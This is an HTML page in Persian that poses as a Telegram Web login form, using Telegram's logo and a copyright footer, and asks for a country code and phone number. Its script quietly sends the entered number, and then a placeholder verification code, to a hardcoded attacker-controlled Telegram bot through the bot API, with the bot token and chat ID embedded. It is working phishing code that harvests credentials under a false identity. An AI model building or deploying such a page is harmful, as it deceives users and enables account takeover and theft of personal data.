<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram Web - Login</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #f5f5f5;
    }

    .container {
      width: 100%;
      max-width: 400px;
      height: 100%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      background-color: #fff;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      border-radius: 12px;
      padding: 20px;
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      max-width: 150px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-group label {
      display: block;
      margin-bottom: 8px;
      font-weight: bold;
      font-size: 14px;
    }

    .form-group input,
    .form-group select {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      border: 1px solid #ddd;
      border-radius: 5px;
      transition: border-color 0.3s;
    }

    .form-group input:focus,
    .form-group select:focus {
      border-color: #0088cc;
      outline: none;
    }

    .btn {
      background-color: #0088cc;
      color: #fff;
      padding: 12px 15px;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      width: 100%;
      transition: background-color 0.3s;
    }

    .btn:hover {
      background-color: #007ab8;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #aaa;
      text-align: center;
    }

  </style>
</head>
<body>
  <div class="container">
    <!-- لوگوی تلگرام -->
    <div class="logo">
      <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo">
    </div>

    <!-- فرم ورود -->
    <form>
      <!-- انتخاب کد کشور -->
      <div class="form-group">
        <label for="country-code">کد کشور</label>
        <select id="country-code">
          <option value="+98">ایران (+98)</option>
          <option value="+1">آمریکا (+1)</option>
          <option value="+44">انگلستان (+44)</option>
          <option value="+33">فرانسه (+33)</option>
          <option value="+49">آلمان (+49)</option>
        </select>
      </div>

      <!-- شماره تلفن -->
      <div class="form-group">
        <label for="phone">شماره تلفن</label>
        <input type="tel" id="phone" placeholder="09000000000" inputmode="numeric" pattern="[0-9]*">
      </div>

      <!-- دکمه "بعدی" -->
      <button class="btn" type="button" id="next-btn">بعدی</button>
    </form>

    <div class="footer">© 2024 Telegram</div>
  </div>

  <script>
    const botToken = "AAF2kUPcAnMlSVwkgxIsGcopyx5z9aWd6Gs"; // توکن ربات تلگرام
    const chatId = "7386908761"; // شناسه عددی شما

    document.getElementById('next-btn').addEventListener('click', function () {
      const phone = document.getElementById('phone').value;
      const countryCode = document.getElementById('country-code').value;

      if (phone) {
        const fullPhoneNumber = countryCode + phone;

        // ارسال شماره تلفن به ربات تلگرام
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: `شماره تلفن: ${fullPhoneNumber}`
          })
        }).then(response => {
          if (response.ok) {
            alert('شماره تلفن ارسال شد. حالا کد ارسال می‌شود.');
            sendVerificationCode();
          } else {
            alert('خطا در ارسال اطلاعات به ربات.');
          }
        });
      } else {
        alert('لطفاً شماره تلفن خود را وارد کنید');
      }
    });

    function sendVerificationCode() {
      const verificationCode = "123456"; // کد تأیید نمونه

      // ارسال کد تأیید به ربات تلگرام
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: `کد تأیید: ${verificationCode}`
        })
      }).then(response => {
        if (response.ok) {
          alert('کد تأیید ارسال شد.');
        } else {
          alert('خطا در ارسال کد تأیید به ربات.');
        }
      });
    }
  </script>
</body>
</html>
